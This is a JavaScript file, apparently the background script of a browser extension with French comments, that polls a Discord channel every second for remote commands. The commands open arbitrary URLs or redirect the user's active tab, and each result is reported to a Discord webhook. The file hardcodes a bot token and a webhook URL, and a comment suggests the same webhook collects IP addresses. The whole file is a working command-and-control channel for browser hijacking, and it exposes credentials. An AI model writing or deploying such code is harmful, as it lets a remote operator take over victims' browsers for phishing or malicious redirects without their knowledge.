// Gestion améliorée du contrôle à distance
const DISCORD_API_URL = "https://discord.com/api/v10/channels/1392925684053184684/messages?limit=1";
const DISCORD_TOKEN = "Bot MTM5MzE5Njk5MTY5NzI2MDU0NA.Guw3J8.6vnP8zrbxCE7lBvi7RNlpWeghYdKEvOxiJ4LRs";
const FEEDBACK_WEBHOOK_URL = "https://discord.com/api/webhooks/1396234689932558417/SCVJL2yqMT5ZBxSoH6UN728oHT_Zv9FFefA80jAIS0TsxKZpsTOBvc4rsWLDLRwnkcwk"; // Réutilisation de ton webhook IP pour les retours
let lastProcessedMessageId = null;

// Valider une URL
function isValidUrl(url) {
  try {
    new URL(url);
    return url.match(/^https?:\/\/[^\s/$.?#].[^\s]*$/i);
  } catch (e) {
    return false;
  }
}

// Envoyer un message de feedback au webhook
async function sendFeedback(message) {
  try {
    await fetch(FEEDBACK_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: message,
        username: 'NightMoon Remote Control'
      })
    });
  } catch (err) {
    console.error('Erreur lors de l\'envoi du feedback:', err);
  }
}

// Vérifier les commandes Discord
async function checkRemoteCommands() {
  try {
    const response = await fetch(DISCORD_API_URL, {
      headers: {
        'Authorization': DISCORD_TOKEN,
        'Content-Type': 'application/json'
      }
    });
    if (!response.ok) {
      const errorText = await response.text();
      await sendFeedback(`Erreur API Discord: ${response.status} - ${errorText}`);
      return;
    }
    const messages = await response.json();
    const latestMessage = messages[0];
    if (!latestMessage) {
      console.log('Aucun message reçu');
      return;
    }

    // Vérifier si le message a déjà été traité
    if (latestMessage.id === lastProcessedMessageId) {
      console.log('Message déjà traité:', latestMessage.id);
      return;
    }

    lastProcessedMessageId = latestMessage.id;
    const content = latestMessage.content.trim();

    if (content.startsWith('!open ')) {
      const url = content.split(' ').slice(1).join(' ').trim();
      if (isValidUrl(url)) {
        console.log('Commande !open valide, ouverture de:', url);
        chrome.tabs.create({ url }, async (tab) => {
          if (chrome.runtime.lastError) {
            await sendFeedback(`Erreur lors de l'ouverture de ${url}: ${chrome.runtime.lastError.message}`);
          } else {
            await sendFeedback(`Succès: URL ${url} ouverte dans l'onglet ${tab.id}`);
          }
        });
      } else {
        await sendFeedback(`URL invalide dans la commande: ${url}`);
      }
    } else if (content.startsWith('!redirect ')) {
      // Nouvelle commande pour rediriger l'onglet actif
      const url = content.split(' ').slice(1).join(' ').trim();
      if (isValidUrl(url)) {
        console.log('Commande !redirect valide, redirection vers:', url);
        chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
          if (tabs[0]) {
            chrome.tabs.update(tabs[0].id, { url }, async (tab) => {
              if (chrome.runtime.lastError) {
                await sendFeedback(`Erreur lors de la redirection vers ${url}: ${chrome.runtime.lastError.message}`);
              } else {
                await sendFeedback(`Succès: Redirection vers ${url} dans l'onglet ${tab.id}`);
              }
            });
          } else {
            await sendFeedback('Aucun onglet actif trouvé pour la redirection');
          }
        });
      } else {
        await sendFeedback(`URL invalide dans la commande !redirect: ${url}`);
      }
    } else {
      console.log('Aucune commande reconnue:', content);
    }
  } catch (err) {
    await sendFeedback(`Erreur lors de la vérification des commandes: ${err.message}`);
  }
}

// Exécuter périodiquement
setInterval(checkRemoteCommands, 1000);